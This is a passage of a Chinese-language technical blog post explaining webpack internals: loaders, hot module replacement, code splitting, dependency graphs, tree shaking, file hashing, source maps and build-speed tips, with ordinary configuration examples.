<h2 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h2><p>在构建阶段的 loader-runner 阶段生效。runLoaders 会调用用户配置的 loader 集合读取、转义资源，然后 webpack 才能进行后续模块依赖的处理。一个 Loader 本质就是一个<strong>函数</strong>，它的职责是<strong>单一</strong>的，只需要完成一种转换。 如果一个源文件需要经历多步转换才能正常使用，就通过多个 Loader 去转换。<br>Loader 函数接收三个参数，分别为：</p>
<ul>
<li>source：资源输入，对于第一个执行的 loader 为资源文件的内容；后续执行的 loader 则为前一个 loader 的执行结果</li>
<li>sourceMap: 可选参数，代码的 <a href="https://link.juejin.cn/?target=https://sourcemap.com/">sourcemap</a> 结构</li>
<li>data: 可选参数，其它需要在 Loader 链中传递的信息，比如 <a href="https://link.juejin.cn/?target=https://github.com/posthtml/posthtml-loader">posthtml/posthtml-loader</a> 就会通过这个参数传递参数的 AST 对象</li>
</ul>
<p>其中 source 是最重要的参数，大多数 Loader 要做的事情就是将 source 转译为另一种形式的 output<br>在调用多个 Loader 去转换一个文件时，每个 Loader 会<strong>链式</strong>的顺序执行， 第一个 Loader 将会拿到需处理的原内容，上一个 Loader 处理后的结果会传给下一个接着处理，最后的 Loader 将处理后的最终结果返回给 Webpack。<br>Webpack 会默认<strong>缓存</strong>所有 Loader 的处理结果直到资源或资源依赖发生变化，也就是说在需要被处理的文件或者其依赖的文件没有发生变化时， 是不会重新调用对应的 Loader 去执行转换操作的。</p>
<h3 id="pitch"><a href="#pitch" class="headerlink" title="pitch"></a>pitch</h3><p>Loader 链条执行过程分三个阶段：pitch、解析资源、执行<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630575987411-da2b1ccb-b0a8-405d-8f18-f25effe72bae.png#clientId=uad1c3d9d-4039-4&from=paste&id=ud41b6a23&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1794&originalType=url%E2%88%B6=1&size=179279&status=done&style=none&taskId=u976e4c64-812c-481b-a1b6-776edaeaec2" alt="image.png"><br>pitch 阶段按配置顺序从左到右逐个执行 loader.pitch 函数(如果有的话)，开发者可以在 pitch 返回任意值中断后续的链路的执行<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630576060183-e67b59a8-3c82-46b7-90f0-fcf6306c4622.png#clientId=uad1c3d9d-4039-4&from=paste&id=u6067eeb4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1794&originalType=url%E2%88%B6=1&size=208176&status=done&style=none&taskId=uff277e87-006c-417e-ada3-71996dc4740" alt="image.png"><br>​</p>
<h3 id="与-webpack-通信"><a href="#与-webpack-通信" class="headerlink" title="与 webpack 通信"></a>与 webpack 通信</h3><ol>
<li>直接 return</li>
<li>通过 this.callback， 这 是 Webpack 给 Loader 注入的 API，以方便 Loader 和 Webpack 之间通信</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">source</span>) &#123;</span><br><span class="line">  <span class="comment">// 通过 this.callback 告诉 Webpack 返回的结果</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">callback</span>(<span class="literal">null</span>, source, sourceMaps);</span><br><span class="line">  <span class="comment">// 当你使用 this.callback 返回内容时，该 Loader 必须返回 undefined，</span></span><br><span class="line">  <span class="comment">// 以让 Webpack 知道该 Loader 返回的结果在 this.callback 中，而不是 return 中</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>异步</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">source</span>) &#123;</span><br><span class="line">  <span class="comment">// 告诉 Webpack 本次转换是异步的，Loader 会在 callback 中回调结果</span></span><br><span class="line">  <span class="keyword">var</span> callback = <span class="variable language_">this</span>.<span class="title function_">async</span>();</span><br><span class="line">  <span class="title function_">someAsyncOperation</span>(source, <span class="keyword">function</span> (<span class="params">err, result, sourceMaps, ast</span>) &#123;</span><br><span class="line">    <span class="comment">// 通过 callback 返回异步执行后的结果</span></span><br><span class="line">    <span class="title function_">callback</span>(err, result, sourceMaps, ast);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="常用-loader"><a href="#常用-loader" class="headerlink" title="常用 loader"></a>常用 loader</h3><ul>
<li>raw-loader：加载文件原始内容（utf-8）</li>
<li>file-loader：把文件输出到一个文件夹中，在代码中通过相对 URL 去引用输出的文件 (处理图片和字体)</li>
<li>url-loader：与 file-loader 类似，区别是用户可以设置一个阈值，大于阈值会交给 file-loader 处理，小于阈值时返回文件 base64 形式编码 (处理图片和字体)</li>
<li>source-map-loader：加载额外的 Source Map 文件，以方便断点调试</li>
<li>svg-inline-loader：将压缩后的 SVG 内容注入代码中</li>
<li>image-loader：加载并且压缩图片文件</li>
<li>json-loader 加载 JSON 文件（默认包含）</li>
<li>handlebars-loader: 将 Handlebars 模版编译成函数并返回</li>
<li>babel-loader：把 ES6 转换成 ES5</li>
<li>ts-loader: 将 TypeScript 转换成 JavaScript</li>
<li>awesome-typescript-loader：将 TypeScript 转换成 JavaScript，性能优于 ts-loader</li>
<li>sass-loader：将 SCSS/SASS 代码转换成 CSS</li>
<li>css-loader：加载 CSS，支持模块化、压缩、文件导入等特性</li>
<li>style-loader：把 CSS 代码注入到 JavaScript 中，通过 DOM 操作去加载 CSS</li>
<li>postcss-loader：扩展 CSS 语法，使用下一代 CSS，可以配合 autoprefixer 插件自动补齐 CSS3 前缀</li>
<li>eslint-loader：通过 ESLint 检查 JavaScript 代码</li>
<li>tslint-loader：通过 TSLint 检查 TypeScript 代码</li>
<li>mocha-loader：加载 Mocha 测试用例的代码</li>
<li>coverjs-loader：计算测试的覆盖率</li>
<li>vue-loader：加载 Vue.js 单文件组件</li>
<li>i18n-loader: 国际化</li>
<li>cache-loader: 可以在一些性能开销较大的 Loader 之前添加，目的是将结果缓存到磁盘里</li>
</ul>
<h2 id="HMR（Hot-Module-Replacement）"><a href="#HMR（Hot-Module-Replacement）" class="headerlink" title="HMR（Hot Module Replacement）"></a>HMR（Hot Module Replacement）</h2><p>不用刷新浏览器而将新变更的模块替换掉旧的模块，还可以保留应用的状态，提高开发效率</p>
<h3 id="开启方法"><a href="#开启方法" class="headerlink" title="开启方法"></a>开启方法</h3><ul>
<li>启动 webpack 命令时，带上 –watch 参数</li>
<li>在配置 webpack.config.js 中设置 watch:true</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="comment">// 必须设置 devServer.hot = true，启动 HMR 功能</span></span><br><span class="line">    <span class="attr">hot</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>HMR 的核心就是客户端从服务端拉去更新后的文件，准确的说是 chunk diff (chunk 需要更新的部分)，实际上 WDS 与浏览器之间维护了一个** Websocket<strong>，当本地资源发生变化时</strong>增量构建**发生变更的模块，WDS 会向浏览器推送更新，并带上构建时的 hash，让客户端与上一次资源进行对比。客户端对比出差异后会向 WDS 发起 Ajax 请求来获取更改内容(文件列表、hash)，这样客户端就可以再借助这些信息继续向 WDS 发起 jsonp 请求获取该 chunk 的增量更新。<br>​</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630482233053-660dbc9c-635c-4b15-a226-3809d74b542e.png#clientId=uca7be9d5-6f50-4&from=paste&id=u6a13f753&margin=%5Bobject%20Object%5D&name=image.png&originHeight=749&originWidth=720&originalType=url%E2%88%B6=1&size=270235&status=done&style=none&taskId=u7ef2e4f6-4876-40df-b58f-9e4b30aa803" alt="image.png"></p>
<ol>
<li>在 webpack 的 watch 模式下，文件系统中某一个文件发生修改，webpack 监听到文件变化，根据配置文件<strong>对模块</strong>重新编译打包，并将打包后的代码通过简单的 JavaScript 对象保存在内存中。</li>
<li>webpack-dev-middleware 调用 webpack 暴露的 API 对代码变化进行监控，并且告诉 webpack，将代码打包到内存中</li>
<li>webpack-dev-server 对文件变化的一个监控，这一步不同于第一步，并不是监控代码变化重新打包。当我们在配置文件中配置了<a href="https://link.zhihu.com/?target=https://webpack.js.org/configuration/dev-server/%23devserver-watchcontentbase">devServer.watchContentBase</a> 为 true 的时候，Server 会监听这些配置文件夹中静态文件的变化，变化后会通知浏览器端对应用进行刷新。</li>
<li>通过 <a href="https://link.zhihu.com/?target=https://github.com/sockjs/sockjs-client">sockjs</a>（webpack-dev-server 的依赖）在浏览器端和服务端之间建立一个 websocket 长连接，将 webpack 编译打包的各个阶段的状态信息告知浏览器端，同时也包括第三步中 Server 监听静态文件变化的信息。浏览器端根据这些 socket 消息进行不同的操作。当然服务端传递的最主要信息还是新模块的 hash 值，后面的步骤根据这一 hash 值来进行模块热替换。</li>
<li>webpack/hot/dev-server 的工作就是根据 webpack-dev-server/client 传给它的信息以及 dev-server 的配置决定是刷新浏览器（11）还是进行模块热更新（6）</li>
<li>HotModuleReplacement.runtime 是客户端 HMR 的中枢，它接收到上一步传递给他的新模块的 hash 值，它通过 JsonpMainTemplate.runtime 向 server 端发送 Ajax 请求，服务端返回一个 json，该 json 包含了所有要更新的模块的 hash 值，获取到更新列表后，该模块再次通过 jsonp 请求，获取到最新的模块代码（7，8，9）。</li>
</ol>
<p>​</p>
<ol start="10">
<li>​HotModulePlugin 将会对新旧模块进行对比，决定是否更新模块，在决定更新模块后，检查模块之间的依赖关系，更新模块的同时更新模块间的依赖引用。</li>
<li>HMR 失败或者 5 判断刷新，进行浏览器刷新来获取最新打包代码</li>
</ol>
<h2 id="代码分割"><a href="#代码分割" class="headerlink" title="代码分割"></a>代码分割</h2><h3 id="默认规则"><a href="#默认规则" class="headerlink" title="默认规则"></a>默认规则</h3><p>默认的分包规则有：</p>
<ul>
<li>同一个 entry 下触达到的模块组织成一个 chunk（initial chunk）</li>
<li>异步模块单独组织为一个 chunk（async chunk）</li>
<li>entry.runtime 单独组织成一个 chunk（runtime chunk）</li>
</ul>
<p>默认规则集中在 compilation.seal 函数实现，seal 核心逻辑运行结束后会生成一系列的 Chunk、ChunkGroup、ChunkGraph 对象，后续如 SplitChunksPlugin 插件会在 Chunk 系列对象上做进一步的拆解、优化，最终反映到输出上才会表现出复杂的分包结果。</p>
<h3 id="Runtime-分包"><a href="#Runtime-分包" class="headerlink" title="Runtime 分包"></a>Runtime 分包</h3><p>除了 entry、异步模块外，webpack 5 之后还支持基于 runtime 的分包规则。除业务代码外，Webpack 编译产物中还需要包含一些用于支持 webpack 模块化、异步加载等特性的支撑性代码，这类代码在 webpack 中被统称为 runtime。虽然每段运行时代码可能都很小，但随着特性的增加，最终结果会越来越大，特别对于多 entry 应用， 可以通过配置使 webpack 运行时代码最终就会集中写入到同一个 chunk，多 entry 间可共享<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630576738307-a4b62e1c-8125-4e1a-9fdf-618ac7f89bef.png#clientId=uad1c3d9d-4039-4&from=paste&height=351&id=uf5fbd1a8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=351&originWidth=653&originalType=binary%E2%88%B6=1&size=41513&status=done&style=none&taskId=u6900cdf9-6c8b-4d1f-87fd-b283fcd6c47&width=653" alt="image.png"></p>
<h3 id="CommonChunkPlugin"><a href="#CommonChunkPlugin" class="headerlink" title="CommonChunkPlugin"></a>CommonChunkPlugin</h3><p>抽出不同 chunk 重复引用的代码，组成父级 chunk<br><img src="https://cdn.nlark.com/yuque/0/2021/webp/106384/1630637392658-d8640311-fa66-40e6-84c5-16c3090476b4.webp#clientId=uad1c3d9d-4039-4&from=paste&id=uca8be444&margin=%5Bobject%20Object%5D&originHeight=238&originWidth=802&originalType=url%E2%88%B6=1&status=done&style=none&taskId=ue9f52fac-826e-43ff-b61f-50d9ee9922f"><br><img src="https://cdn.nlark.com/yuque/0/2021/webp/106384/1630637396944-d9c2ac89-c04f-4f17-8b2e-fb848bb4ff0f.webp#clientId=uad1c3d9d-4039-4&from=paste&id=u2bd26130&margin=%5Bobject%20Object%5D&originHeight=497&originWidth=886&originalType=url%E2%88%B6=1&status=done&style=none&taskId=u8cca1d4d-1602-480f-8fa4-d91557713b5"></p>
<h3 id="SplitChunksPlugin"><a href="#SplitChunksPlugin" class="headerlink" title="SplitChunksPlugin"></a>SplitChunksPlugin</h3><p>CommonsChunkPlugin 于 4.0 及以后被移除，使用 SplitChunksPlugin 替代。可以当配置项使用。在默认情况下，SplitChunksPlugin 仅仅影响按需加载的代码块，因为更改初始块会影响 HTML 文件应包含的脚本标记以运行项目。webpack 将根据以下条件自动拆分代码块：</p>
<ul>
<li>会被共享的代码块或者 node_mudules 文件夹中的代码块</li>
<li>体积大于 30KB 的代码块（在 gz 压缩前）</li>
<li>按需加载代码块时的并行请求数量不超过 5 个</li>
<li>加载初始页面时的并行请求数量不超过 3 个</li>
</ul>
<p>​</p>
<p>​</p>
<p>​</p>
<h2 id="依赖收集"><a href="#依赖收集" class="headerlink" title="依赖收集"></a>依赖收集</h2><h3 id="Dependency-Graph"><a href="#Dependency-Graph" class="headerlink" title="Dependency Graph"></a>Dependency Graph</h3><p>Webpack 4.x 的 Dependency Graph 实现较简单，主要由 Dependence/Module 内置的系列属性记录引用、被引用关系。<br>而 Webpack 5.0 之后则实现了一套相对复杂的类结构记录模块间依赖关系，将模块依赖相关的逻辑从 Dependence/Module 解耦为一套独立的类型结构，主要类型有：</p>
<ul>
<li>ModuleGraph ：记录 Dependency Graph 信息的<strong>容器</strong>，一方面保存了构建过程中涉及到的所有** module 、dependency <strong>对象，以及这些</strong>对象互相之间的引用**；另一方面提供了各种工具方法，方便使用者迅速读取出 module 或 dependency 附加的信息</li>
<li>ModuleGraphConnection ：记录<strong>模块间引用关系的数据结构</strong>，内部通过 originModule 属性记录引用关系中的父模块，通过 module 属性记录子模块。此外还提供了一系列函数工具用于判断对应的引用关系的有效性</li>
<li>ModuleGraphModule ：Module 对象在 Dependency Graph 体系下的补充信息，包含模块对象的 incomingConnections —— 指向模块本身的 ModuleGraphConnection 集合，即谁引用了模块自己；outgoingConnections —— 该模块对外的依赖，即该模块引用了其他那些模块。</li>
</ul>
<p>​</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630575130712-25f83667-f43a-47e6-9aa4-dd496d59308e.png#clientId=uad1c3d9d-4039-4&from=paste&id=udcb9134f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=876&originWidth=1654&originalType=url%E2%88%B6=1&size=235530&status=done&style=none&taskId=u3fc78e68-27b4-4aad-b71e-a3c17a30823" alt="image.png"></p>
<h3 id="依赖收集过程"><a href="#依赖收集过程" class="headerlink" title="依赖收集过程"></a>依赖收集过程</h3><p>依赖关系收集过程主要发生在两个节点：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630575380574-ce88e7e5-fe8f-4a22-b716-ed1b6e03b62b.png#clientId=uad1c3d9d-4039-4&from=paste&id=ud3a646e5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1854&originWidth=2574&originalType=url%E2%88%B6=1&size=518148&status=done&style=none&taskId=u86c51e84-9bab-474a-946a-80f6bfd737c" alt="image.png"></p>
<ul>
<li>addDependency ：webpack 从模块内容中解析出引用关系后，创建适当的 Dependency 子类并调用该方法记录到 module 实例</li>
<li>handleModuleCreation ：模块解析完毕后，webpack 遍历父模块的依赖集合，调用该方法创建 Dependency 对应的子模块对象，之后调用 compilation.moduleGraph.setResolvedModule 方法将父子引用信息记录到 moduleGraph 对象上</li>
</ul>
<h4 id="运行时依赖收集"><a href="#运行时依赖收集" class="headerlink" title="运行时依赖收集"></a>运行时依赖收集</h4><ul>
<li>第一次循环遍历所有 module，收集所有 module 的 runtime 依赖</li>
<li>第二次循环遍历所有 chunk，将 chunk 下所有 module 的 runtime 统一收录到 chunk 中</li>
<li>第三次循环遍历所有 runtime chunk，收集其对应的子 chunk 下所有 runtime 依赖，之后遍历所有依赖并发布 runtimeRequirementInTree 钩子，(主要是) RuntimePlugin 插件订阅该钩子并根据依赖类型创建对应的 RuntimeModule 子类实例</li>
</ul>
<p>​</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><h4 id="信息索引"><a href="#信息索引" class="headerlink" title="信息索引"></a>信息索引</h4><p>ModuleGraph 类型提供了很多实现 module / dependency 信息查询的工具函数</p>
<h4 id="构建-ChunkGraph"><a href="#构建-ChunkGraph" class="headerlink" title="构建 ChunkGraph"></a>构建 ChunkGraph</h4><p>Webpack 主体流程中，make 构建阶段结束之后会进入 seal 阶段，开始梳理以何种方式组织输出内容。每个 entry 对应组织为一个 chunk ，之后调用 webpack/lib/buildChunkGraph.js 文件定义的 buildChunkGraph 方法，<strong>遍历 make 阶段生成的 moduleGraph 对象</strong>从而将 module 依赖关系转化为 chunkGraph 对象。<br>​</p>
<h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><h3 id="按需加载"><a href="#按需加载" class="headerlink" title="按需加载"></a>按需加载</h3><p>插入异步 import，调用时再加载</p>
<h3 id="Tree-shaking"><a href="#Tree-shaking" class="headerlink" title="Tree shaking"></a>Tree shaking</h3><ol>
<li>Make 阶段，收集模块导出变量并记录到模块依赖关系图 ModuleGraph 变量中<ol>
<li>将模块的所有 ESM 导出语句转换为 Dependency 对象，并记录到 module 对象的 dependencies 集合</li>
<li>所有模块都编译完毕后，触发 compilation.hooks.finishModules 钩子，开始执行 FlagDependencyExportsPlugin 插件回调</li>
<li>FlagDependencyExportsPlugin 插件从 entry 开始读取 ModuleGraph 中存储的模块信息，遍历所有 module 对象</li>
<li>遍历 module 对象的 dependencies 数组，找到所有 HarmonyExportXXXDependency 类型的依赖对象，将其转换为 ExportInfo 对象并记录到 ModuleGraph 体系中</li>
</ol>
</li>
<li>Seal 阶段，遍历 ModuleGraph 标记模块导出变量有没有被使用<ol>
<li>触发 compilation.hooks.optimizeDependencies 钩子，开始执行 FlagDependencyUsagePlugin 插件逻辑</li>
<li>在 FlagDependencyUsagePlugin 插件中，从 entry 开始逐步遍历 ModuleGraph 存储的所有 module 对象</li>
<li>遍历 module 对象对应的 exportInfo 数组</li>
<li>为每一个 exportInfo 对象执行 compilation.getDependencyReferencedExports 方法，确定其对应的 dependency 对象有否被其它模块使用</li>
<li>被任意模块使用到的导出值，调用 exportInfo.setUsedConditionally 方法将其标记为已被使用。</li>
<li>exportInfo.setUsedConditionally 内部修改 exportInfo._usedInRuntime 属性，记录该导出被如何使用</li>
<li>结束</li>
</ol>
</li>
<li>生成产物时，若变量没有被其它模块使用则删除对应的导出语句<ol>
<li>打包阶段，调用 HarmonyExportXXXDependency.Template.apply 方法生成代码</li>
<li>在 apply 方法内，读取 ModuleGraph 中存储的 exportsInfo 信息，判断哪些导出值被使用，哪些未被使用</li>
<li>对已经被使用及未被使用的导出值，分别创建对应的 HarmonyExportInitFragment 对象，保存到 initFragments 数组</li>
<li>遍历 initFragments 数组，生成最终结果</li>
</ol>
</li>
</ol>
<h2 id="文件监听"><a href="#文件监听" class="headerlink" title="文件监听"></a>文件监听</h2><p>在发现源码发生变化时，自动重新构建出新的输出文件<br>轮询判断文件的最后编辑时间是否变化，如果某个文件发生了变化，并不会立刻告诉监听者，而是先缓存起来，等 aggregateTimeout 后再执行<br>​</p>
<h2 id="文件指纹"><a href="#文件指纹" class="headerlink" title="文件指纹"></a>文件指纹</h2><p>文件指纹是打包后输出的文件名的后缀。</p>
<ul>
<li>Hash：和整个项目的构建相关，只要项目文件有修改，整个项目构建的 hash 值就会更改</li>
<li>Chunkhash：和 Webpack 打包的 chunk 有关，不同的 entry 会生出不同的 chunkhash</li>
<li>Contenthash：根据文件内容来定义 hash，文件内容不变，则 contenthash 不变</li>
</ul>
<p>​</p>
<h3 id="JS-的文件指纹设置"><a href="#JS-的文件指纹设置" class="headerlink" title="JS 的文件指纹设置"></a>JS 的文件指纹设置</h3><p>设置 output 的 filename，用 chunkhash</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: &#123;</span><br><span class="line">    <span class="attr">app</span>: <span class="string">&quot;./scr/app.js&quot;</span>,</span><br><span class="line">    <span class="attr">search</span>: <span class="string">&quot;./src/search.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;[name][chunkhash:8].js&quot;</span>,</span><br><span class="line">    <span class="attr">path</span>: __dirname + <span class="string">&quot;/dist&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="CSS-的文件指纹设置"><a href="#CSS-的文件指纹设置" class="headerlink" title="CSS 的文件指纹设置"></a>CSS 的文件指纹设置</h3><p>设置 MiniCssExtractPlugin 的 filename，使用 contenthash</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: &#123;</span><br><span class="line">    <span class="attr">app</span>: <span class="string">&quot;./scr/app.js&quot;</span>,</span><br><span class="line">    <span class="attr">search</span>: <span class="string">&quot;./src/search.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;[name][chunkhash:8].js&quot;</span>,</span><br><span class="line">    <span class="attr">path</span>: __dirname + <span class="string">&quot;/dist&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">MiniCssExtractPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">filename</span>: <span class="string">`[name][contenthash:8].css`</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="图片的文件指纹设置"><a href="#图片的文件指纹设置" class="headerlink" title="图片的文件指纹设置"></a>图片的文件指纹设置</h3><p>设置 file-loader 的 name，使用 hash。<br>占位符名称及含义</p>
<ul>
<li>ext 资源后缀名</li>
<li>name 文件名称</li>
<li>path 文件的相对路径</li>
<li>folder 文件所在的文件夹</li>
<li>contenthash 文件的内容 hash，默认是 md5 生成</li>
<li>hash 文件内容的 hash，默认是 md5 生成</li>
<li>emoji 一个随机的指代文件内容的 emoj</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/index.js&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;dist&quot;</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.(png|svg|jpg|gif)$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&quot;file-loader&quot;</span>,</span><br><span class="line">            <span class="attr">options</span>: &#123;</span><br><span class="line">              <span class="attr">name</span>: <span class="string">&quot;img/[name][hash:8].[ext]&quot;</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="source-map"><a href="#source-map" class="headerlink" title="source map"></a>source map</h2><p>source map 是将编译、打包、压缩后的代码映射回源代码的过程。打包压缩后的代码不具备良好的可读性，想要调试源码就需要 soucre map。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: <span class="string">&quot;Yoda_output.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sources&quot;</span>: [<span class="string">&quot;Yoda_input.txt&quot;</span>],</span><br><span class="line">    <span class="comment">// 包含所有符号的数组</span></span><br><span class="line">    <span class="string">&quot;names&quot;</span>: [<span class="string">&quot;the&quot;</span>, <span class="string">&quot;force&quot;</span>, <span class="string">&quot;feel&quot;</span>],</span><br><span class="line">    <span class="comment">// 每一个分号 ; 表示一行，多个空行就是多个 ;，mapping 通过 , 分割。</span></span><br><span class="line">    <span class="comment">// mapping有五位：</span></span><br><span class="line">    <span class="comment">// 第一位是目标代码中的列数  第二位是源码所在的文件名  第三位是源码对应的行数  第四位是源码对应的列数  第五位是源码对应的 names，不一定有</span></span><br><span class="line">    <span class="comment">// 每一位是通过 VLQ 编码的，一个字符就能表示行列数</span></span><br><span class="line">    <span class="string">&quot;mappings&quot;</span>: <span class="string">&quot;AACKA,IACIC,MACTC;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="优化构建速度"><a href="#优化构建速度" class="headerlink" title="优化构建速度"></a>优化构建速度</h2><ul>
<li>使用高版本的 Webpack 和 Node.js</li>
<li>多进程/多实例构建：<ul>
<li>HappyPack(不维护了)、thread-loader</li>
</ul>
</li>
<li>压缩代码<ul>
<li>多进程并行压缩<ul>
<li>webpack-paralle-uglify-plugin</li>
<li>uglifyjs-webpack-plugin 开启 parallel 参数 (不支持 ES6)</li>
<li>terser-webpack-plugin 开启 parallel 参数</li>
</ul>
</li>
<li>通过 mini-css-extract-plugin 提取 Chunk 中的 CSS 代码到单独文件，通过 css-loader 的 minimize 选项开启 cssnano 压缩 CSS。</li>
</ul>
</li>
<li>图片压缩<ul>
<li>使用基于 Node 库的 imagemin (很多定制选项、可以处理多种图片格式)</li>
<li>配置 image-webpack-loader</li>
</ul>
</li>
<li>缩小打包作用域：<ul>
<li>exclude/include (确定 loader 规则范围)</li>
<li>resolve.modules 指明第三方模块的绝对路径 (减少不必要的查找)</li>
<li>resolve.mainFields 只采用 main 字段作为入口文件描述字段 (减少搜索步骤，需要考虑到所有运行时依赖的第三方模块的入口文件描述字段)</li>
<li>resolve.extensions 尽可能减少后缀尝试的可能性</li>
<li>noParse 对完全不需要解析的库进行忽略 (不去解析但仍会打包到 bundle 中，注意被忽略掉的文件里不应该包含 import、require、define 等模块化语句)</li>
<li>IgnorePlugin (完全排除模块)</li>
<li>合理使用 alias</li>
</ul>
</li>
<li>提取页面公共资源：<ul>
<li>基础包分离：<ul>
<li>使用 html-webpack-externals-plugin，将基础包通过 CDN 引入，不打入 bundle 中</li>
<li>使用 SplitChunksPlugin 进行(公共脚本、基础包、页面公共文件)分离(Webpack4 内置) ，替代了 CommonsChunkPlugin 插件</li>
